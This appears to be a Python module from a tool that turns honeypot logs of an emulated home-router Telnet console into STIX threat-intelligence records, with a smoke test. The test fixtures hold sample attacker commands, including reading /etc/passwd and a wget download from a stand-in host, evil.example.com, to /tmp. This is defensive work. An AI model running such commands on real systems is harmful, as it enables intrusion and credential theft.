"""Router parser — honeypot-router (Telnet console) emulator.

The "Router" honeypot emulates the Telnet management console of a
consumer-grade home router (Linksys / TP-Link / Mikrotik clones —
the same gear Mirai-class botnets target on port 23).  Attackers
authenticate (usually with default creds out of a worm's word-list)
and then run commands against the fake CLI.  We capture those
commands and treat any session that ran one or more as substantive.

Per V1_SPEC.md §5.23:

  T-Pot doc fields used:
    src_ip, session_id (when present), commands, dst_port

  Event correlation:
    Prefer `correlate_by_session_id` when the router emits a
    `session` / `session_id` field; fall back to
    `correlate_by_window` (300s) for events that lack one.  The
    fallback mirrors the V0 importer's max_gap_seconds: 300 per
    docs/LESSONS_LEARNED_FROM_V0.md §6.

  Substance filter:
    Substantive iff the session ran at least one command.  V1_SPEC
    §5.23 literally says "Process(joined commands) if any commands
    run"; the inverse — no commands — is a pure connect/auth probe
    and routes to the drive-by Sighting path.

  STIX emitted (by the orchestrator from session state):
    - IPv4-Addr (via builder.build_attacker_context)
    - Sighting
    - Process(joined commands) if `session.commands` is non-empty.

Notes on the `type` registration:
  V1_SPEC §5.23 phrases the T-Pot type as `"Router" or similar`,
  acknowledging that T-Pot has shipped the router honeypot under
  different type names across versions ("Router", "Routerpot", or
  a custom logstash mapping).  We register this parser as "Router"
  — the most common name and the spec's primary form.  If the
  installed T-Pot uses a different exact type string, the fallback
  parser (§5.24) catches it and we never silently drop the doc.
"""

from __future__ import annotations

import logging
from typing import Iterable, Optional

from tpot2cti.parsers import register
from tpot2cti.parsers.base import AttackSession, BaseParser, ParsedEvent
from tpot2cti.session import correlate_by_session_id, correlate_by_window

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

#: Window (seconds) for `correlate_by_window` fallback when no session_id
#: is available on the router events.  Matches the project-wide default.
ROUTER_WINDOW_SECONDS = 300


# ---------------------------------------------------------------------------
# Parser
# ---------------------------------------------------------------------------

class RouterParser(BaseParser):
    """Parser for T-Pot's router (Telnet console) emulator honeypot."""

    type_name = "Router"

    # ──────────────────────────────────────────────────────────────────
    # parse() — one ES doc → one ParsedEvent
    # ──────────────────────────────────────────────────────────────────

    def parse(self, doc: dict) -> Optional[ParsedEvent]:
        """Convert one router-honeypot ES doc into a ParsedEvent.

        The router can emit either:
          - a single doc per connection carrying a list of
            `commands`, OR
          - one doc per command with `command` (singular) set.
        We normalize both shapes into `event.meta["commands"]` as a
        list[str] for the aggregator.  Returns None for malformed
        docs (no src_ip / @timestamp) per V1_SPEC §7.
        """
        src_ip = doc.get("src_ip")
        if not src_ip:
            logger.debug("router: doc missing src_ip; skipping")
            return None

        ts = self._parse_timestamp(doc)
        if ts is None:
            logger.debug("router: doc missing/unparseable @timestamp; skipping")
            return None

        # Normalize the commands shape — accept either `commands` (list)
        # or `command` (singular string) so we work with both T-Pot
        # router-honeypot variants.
        commands: list[str] = []
        raw_cmds = doc.get("commands")
        if isinstance(raw_cmds, list):
            commands.extend(str(c) for c in raw_cmds if c not in (None, ""))
        elif isinstance(raw_cmds, str) and raw_cmds.strip():
            commands.append(raw_cmds)
        if (single := doc.get("command")) and isinstance(single, str) and single.strip():
            commands.append(single)

        # Session id may live under `session`, `session_id`, or
        # `connection_id` depending on the emitter.
        session_id = (
            doc.get("session")
            or doc.get("session_id")
            or doc.get("connection_id")
        )

        event = ParsedEvent(
            src_ip=str(src_ip),
            timestamp=ts,
            sensor_hostname=str(
                doc.get("t-pot_hostname")
                or (doc.get("host") or {}).get("name")
                or "unknown"
            ),
            event_type="Router",
            session_id=str(session_id) if session_id else None,
            src_port=self._safe_int(doc.get("src_port")),
            dst_port=self._safe_int(
                doc.get("dst_port") or doc.get("dest_port") or 23
            ),
            dst_ip=doc.get("dst_ip") or doc.get("dest_ip"),
            protocol="telnet",
            raw_doc=doc,
        )
        self._populate_geoip(doc, event)

        if commands:
            event.meta["commands"] = commands
        # Stash a single representative `command` too (first one) for
        # downstream consumers that prefer the singular form.
        if commands:
            event.meta["command"] = commands[0]

        return event

    # ──────────────────────────────────────────────────────────────────
    # correlate() — by session_id when present, by window otherwise
    # ──────────────────────────────────────────────────────────────────

    def correlate(self, events: Iterable[ParsedEvent]) -> list[AttackSession]:
        """Use `correlate_by_session_id` when ALL events carry a
        session_id; otherwise fall back to the 300s window correlator.

        The split is per-batch, not per-event: mixing modes inside one
        batch would produce duplicate sessions for events that match
        both a session_id group and a windowed group.  A coherent
        choice across the batch matches the V0 importer's behavior.
        """
        events_list = list(events)
        if events_list and all(e.session_id for e in events_list):
            return correlate_by_session_id(
                events_list, aggregator=self._aggregate_session
            )
        return correlate_by_window(
            events_list,
            window_seconds=ROUTER_WINDOW_SECONDS,
            aggregator=self._aggregate_session,
        )

    def _aggregate_session(
        self, session: AttackSession, events: list[ParsedEvent]
    ) -> None:
        """Walk per-event meta and populate `session.commands` and
        `session.dst_ports`.  Commands are appended in event-order
        (ascending by timestamp per correlator guarantees) so the
        Process SDO command_line reads as the attacker typed it."""
        for e in events:
            cmds = e.meta.get("commands") or []
            if isinstance(cmds, list):
                for c in cmds:
                    cs = str(c)
                    if cs and cs not in session.commands:
                        session.commands.append(cs)
            if e.dst_port is not None:
                session.dst_ports.add(e.dst_port)

    # ──────────────────────────────────────────────────────────────────
    # has_substance() — at least one command run
    # ──────────────────────────────────────────────────────────────────

    def has_substance(self, session: AttackSession) -> bool:
        """A router session is substantive iff at least one command
        was executed.

        Per V1_SPEC §5.23: "Process(joined commands) if any commands
        run" — the inverse is: no commands → no Process → no full
        SDO graph, just the drive-by Sighting.  Auth attempts alone
        do not qualify (the router honeypot accepts default creds
        almost universally, so authentication is not a substance
        signal here).
        """
        return bool(session.commands)

    # ──────────────────────────────────────────────────────────────────
    # Helpers
    # ──────────────────────────────────────────────────────────────────

    @staticmethod
    def _safe_int(value) -> Optional[int]:
        if value is None:
            return None
        try:
            return int(value)
        except (TypeError, ValueError):
            return None


# Register on import
register(RouterParser())


# ---------------------------------------------------------------------------
# Smoke test
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    from datetime import datetime, timedelta, timezone

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    parser = RouterParser()
    now = datetime.now(timezone.utc)

    # ── Case 1: drive-by — connect with NO commands ───────────────────
    driveby_doc = {
        "@timestamp": now.isoformat(),
        "type": "Router",
        "src_ip": "203.0.113.60",
        "src_port": 51200,
        "dst_port": 23,
        "t-pot_hostname": "node1",
        "session": "rsess-empty",
        "commands": [],
        "geoip": {"country_iso_code": "US", "asn": 64500},
    }

    # ── Case 2: substantive — single doc with a list of commands ──────
    list_doc = {
        "@timestamp": now.isoformat(),
        "type": "Router",
        "src_ip": "198.51.100.80",
        "src_port": 51201,
        "dst_port": 23,
        "t-pot_hostname": "node1",
        "session": "rsess-list-A",
        "commands": [
            "enable",
            "cat /etc/passwd",
            "wget http://evil.example.com/x -O /tmp/x",
        ],
        "geoip": {"country_iso_code": "CN", "asn": 4134},
    }

    # ── Case 3: substantive — per-command docs sharing a session_id ──
    base = {
        "type": "Router",
        "src_ip": "198.51.100.81",
        "src_port": 51202,
        "dst_port": 23,
        "t-pot_hostname": "node1",
        "session": "rsess-multi-B",
    }
    per_cmd_docs = [
        {**base,
         "@timestamp": now.isoformat(),
         "command": "enable"},
        {**base,
         "@timestamp": (now + timedelta(seconds=2)).isoformat(),
         "command": "ls -la"},
        {**base,
         "@timestamp": (now + timedelta(seconds=5)).isoformat(),
         "command": "uname -a"},
    ]

    # ── Case 4: substantive — no session_id, window-correlated burst ──
    base_nosid = {
        "type": "Router",
        "src_ip": "198.51.100.82",
        "dst_port": 23,
        "t-pot_hostname": "node1",
    }
    nosid_docs = [
        {**base_nosid, "@timestamp": now.isoformat(),
         "command": "id"},
        {**base_nosid,
         "@timestamp": (now + timedelta(seconds=30)).isoformat(),
         "command": "whoami"},
    ]

    drive_event = parser.parse(driveby_doc)
    list_event = parser.parse(list_doc)
    per_events = [parser.parse(d) for d in per_cmd_docs]
    nosid_events = [parser.parse(d) for d in nosid_docs]
    assert drive_event is not None
    assert list_event is not None
    assert all(e is not None for e in per_events)
    assert all(e is not None for e in nosid_events)

    drive_sessions = parser.correlate([drive_event])
    list_sessions = parser.correlate([list_event])
    per_sessions = parser.correlate(per_events)
    nosid_sessions = parser.correlate(nosid_events)

    assert len(drive_sessions) == 1
    assert len(list_sessions) == 1
    assert len(per_sessions) == 1, (
        f"per-cmd docs must fold into 1 session, got {len(per_sessions)}"
    )
    assert len(nosid_sessions) == 1, (
        f"no-sid burst must fold into 1 session via window correlator, "
        f"got {len(nosid_sessions)}"
    )

    drive_s = drive_sessions[0]
    list_s = list_sessions[0]
    per_s = per_sessions[0]
    nosid_s = nosid_sessions[0]

    assert parser.has_substance(drive_s) is False, "empty-cmds must be drive-by"
    assert parser.has_substance(list_s) is True, "command list must be substantive"
    assert parser.has_substance(per_s) is True, "per-cmd docs must be substantive"
    assert parser.has_substance(nosid_s) is True, "windowed burst must be substantive"

    # Aggregator: commands populated in order
    assert list_s.commands == [
        "enable",
        "cat /etc/passwd",
        "wget http://evil.example.com/x -O /tmp/x",
    ]
    assert per_s.commands == ["enable", "ls -la", "uname -a"]
    assert nosid_s.commands == ["id", "whoami"]

    # dst_ports populated
    assert 23 in list_s.dst_ports

    print("OK")
